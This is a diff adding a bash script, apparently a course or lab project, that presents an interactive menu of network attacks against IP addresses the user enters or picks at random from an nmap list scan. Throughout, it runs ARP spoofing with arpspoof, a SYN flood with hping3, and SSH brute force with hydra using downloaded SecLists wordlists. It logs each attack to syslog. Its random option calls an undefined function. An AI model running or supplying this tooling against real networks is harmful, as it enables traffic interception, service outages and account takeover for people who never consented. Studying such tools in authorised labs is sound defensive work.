@@ -1,0 +1,158 @@
+#!/bin/bash
+
+
+echo "Welcome! This service will give you options of 3 kinds of attacks."    #This introduces the user to the program.
+echo "The tools used in this service are: nmap, shuf, wget, logger, hping3, hydra, arpspoof. Please ensure you have these tools before starting the service. Thanks" 	#This lets the user know what tools the program needs to function.
+echo "<- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->"
+echo
+
+#	As we needed the user input and choices the menu was created
+#	Define an array of menu options
+#		https://askubuntu.com/questions/1705/how-can-i-create-a-select-menu-in-a-shell-script
+options=("ARP spoofing Attack" "DoS Attack" "BF Attack" "Random Attack" "Quit")
+
+	echo -n "[?] Please enter the IP range you want to scan (EG: 192.168.126.130-140 or 192.168.126/24): "
+	read RANGE
+	nmap $RANGE -sL | awk '{print $(NF)}' | tr -d '()' | grep ^[0-9]> .IPLIST 
+
+for ip_addr in $(cat .IPLIST)
+	do
+	echo $ip_addr
+	done
+	echo "These IP addressess will be saved into the list .IPLIST"
+	echo
+
+#	Describing the options before the choice is given to the user.	
+echo "Now you may choose what attack to attempt!
+We have these options:
+(1) ARP spoofing Attack : This attack will send fake ARP messages to a victim's machine. 
+(2) Denial of Service Attack : This attack will flood the server of your choice via the port of your choice.
+(3) Brtue Force Attack : This attack will attempt to log in to the SSH network of your choice.
+(4) Randomly chose an attack from the above list. 
+(5) Quit "
+echo	
+
+#	Used the command shuf to get random input 
+#		https://www.geeksforgeeks.org/shuf-command-in-linux-with-examples/
+
+function pick_or_random_IP()
+{
+	echo "[?] Would you like to (1) pick an IP to attack or (2) randomly attack an IP address from the list?"
+	read user_IP_decision
+	if [ $user_IP_decision = 2 ] ; then
+	IP_choice=$(shuf -n 1 .IPLIST)
+	echo $IP_choice
+	else
+	echo "[?] Please enter the IP address you would like to attack: "
+	read IP_choice
+	fi
+}
+
+function log_attack() {
+	logger -t logforattack "$1"
+}
+
+function arp_spoof_attack()
+{
+	echo "This ARP spoofing attack will send fake ARP messages to your victim's machine."
+	#https://www.oreilly.com/library/view/learn-kali-linux/9781789611809/1bb735da-180c-4178-890f-b7026e8ea6ec.xhtml
+	#https://www.crowdstrike.com/en-us/cybersecurity-101/social-engineering/arp-spoofing/
+	pick_or_random_IP
+	echo "Please enter IP address of the gateway: "
+	read gateway_ip_add
+	echo "Now performing ARP spoofing attack."
+	sudo arpspoof -i eth0 -r -t $IP_choice $gateway_ip_add
+	echo "ARP spoofing attack done on $IP_choice ."
+	log_attack "ARP spoofing Attack on $IP_choice was executed on : [$(date "+%Y-%m-%d %H:%M:%S")]. " 
+	echo "The location of log is: /var/log/syslog. (For some machines it can be saved at /var/log/messages or /var/log/user.log)"
+	echo "The logs have been tagged with logforattack to make it easier to pull up when needed."
+}
+
+function dos_attack()
+{
+	echo "This Denial of Service attack will flood the server of your choice via the port of your choice using Hping3."
+	#https://www.hackercoolmagazine.com/beginners-guide-to-hping3/?srsltid=AfmBOoomaSWHgeR097dwmuS5FlqMkGST_n3f8aRaMUm5sDNDg_xbkjbH
+	#https://medium.com/@rabbiyatabassum/denial-of-service-dos-attack-67755f5109b7
+	pick_or_random_IP
+	echo "Please enter the port number: "
+	read port_choice
+	echo "Now flooding the $IP_choice via $port_choice...This may take some time. Please take a well deserved break. Thanks for your patience. :)"
+	sudo hping3 --flood -S $IP_choice -p $port_choice
+	echo "DoS Attack done on $IP_choice via port $port_choice!"
+	log_attack "DoS Attack on $IP_choice was executed on : [$(date "+%Y-%m-%d %H:%M:%S")]. " 
+	echo "The location of log is: /var/log/syslog. (For some machines it can be saved at /var/log/messages or /var/log/user.log)"
+	echo "The logs have been tagged with logforattack to make it easier to pull up when needed."
+
+}
+
+function brute_force_attack()
+{
+	echo "This Brute Force Attack will attempt to log in to the SSH network of your choice using a default list."
+	pick_or_random_IP
+	echo "Proceeding to test weak passwords via SSH with Hydra."
+	wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt -O password_list.txt > /dev/null 2>&1
+	wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt -O username_list.txt > /dev/null 2>&1
+	echo "This may take some time. Please take a well deserved break. Thanks for your patience. :)"
+	hydra -L username_list.txt -P password_list.txt -o SSH_file.txt ssh://$IP_choice &> SSH_full.lst 
+	echo "[+] Bruteforcing done for $IP_choice! Results are saved in SSH_full.lst ."
+	log_attack "Brute Force Attack on $IP_choice was executed on : [$(date "+%Y-%m-%d %H:%M:%S")]. " 
+	echo "The location of log is: /var/log/syslog. (For some machines it can be saved at /var/log/messages or /var/log/user.log)"
+	echo "The logs have been tagged with logforattack to make it easier to pull up when needed."
+}
+
+#	Used the command shuf to get random input 
+#		https://www.geeksforgeeks.org/shuf-command-in-linux-with-examples/
+
+function random_generator()
+{
+			randomchoice=$(shuf -i 1-3 -n 1)
+			echo $randomchoice
+			if [ $randomchoice = 1 ] ; then 
+				mitm_attack
+fi
+			if [ $randomchoice = 2 ] ; then 
+				dos_attack
+fi
+			if [ $randomchoice = 3 ] ; then 
+				brute_force_attack
+fi
+}
+
+
+# This will be the first menu the user sees.
+PS3="
+[?] What would you like to do? Please enter your choice: "
+select option in "${options[@]}"; do
+    case $option in
+        "ARP spoofing Attack")
+			arp_spoof_attack
+			break
+            ;;
+        "DoS Attack")
+            dos_attack
+            break
+            ;;
+        "BF Attack")
+			brute_force_attack
+			break
+			;;
+        "Random Attack")
+			random_generator
+			break
+            ;;
+        "Quit")
+			echo "Thanks for using this service!"
+            exit
+            ;;
+		*)
+            echo "[!] Invalid option. Please try again later. Thank you."
+            exit
+            exit
+            ;;
+    esac
+done
+echo
+echo
+
+
+echo Thank you for using this service. 
